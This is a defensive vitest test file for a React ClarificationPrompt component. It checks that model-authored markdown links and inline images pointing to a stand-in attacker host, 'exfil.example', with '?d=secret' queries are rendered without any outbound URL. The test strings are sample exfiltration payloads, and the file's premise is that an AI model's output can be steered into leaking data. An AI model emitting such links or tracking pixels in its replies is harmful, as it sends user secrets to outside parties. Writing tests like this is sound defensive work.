// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (c) 2026 Cascadia PLM LLC

/**
 * ClarificationPrompt markdown link egress.
 *
 * Security gate, same shape as `ChatMessage.links.test.tsx` in core. The
 * `question` text is model-authored and rendered live in the design
 * workspace — see `ActivityFeed.links.test.tsx` for the full threat model.
 *
 * Run: npx vitest run cascadia-design-engine/src/components/design-engine/ClarificationPrompt.links.test.tsx
 */

import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { ClarificationPrompt } from './ClarificationPrompt'

const EVIL = 'exfil.example'

/** Every non-empty URL-bearing attribute the render produced. */
function renderedUrls(): Array<string> {
  return Array.from(document.querySelectorAll('[href], [src]')).flatMap((el) =>
    ['href', 'src'].flatMap((attr) => {
      const value = el.getAttribute(attr)
      return value ? [value] : []
    }),
  )
}

describe('ClarificationPrompt markdown links', () => {
  it('renders an external link as text with no destination', () => {
    render(
      <ClarificationPrompt
        questionId="q1"
        question={`Use [this material](https://${EVIL}/collect?d=secret)?`}
      />,
    )

    expect(screen.getByText('this material')).toBeInTheDocument()
    expect(document.querySelector('a')).toBeNull()
    expect(document.body.innerHTML).not.toContain(EVIL)
  })

  it('gives an inline image no source off this origin', () => {
    render(
      <ClarificationPrompt
        questionId="q1"
        question={`![chart](https://${EVIL}/pixel.png?d=secret)`}
      />,
    )

    expect(document.querySelector('img')).toBeNull()
    expect(renderedUrls()).toEqual([])
    expect(document.body.innerHTML).not.toContain(EVIL)
    expect(screen.getByText('chart')).toBeInTheDocument()
  })

  it('still renders an image this app serves', () => {
    render(
      <ClarificationPrompt
        questionId="q1"
        question="![drawing](/api/v1/files/abc/download)"
      />,
    )

    expect(screen.getByAltText('drawing')).toHaveAttribute(
      'src',
      '/api/v1/files/abc/download',
    )
  })
})
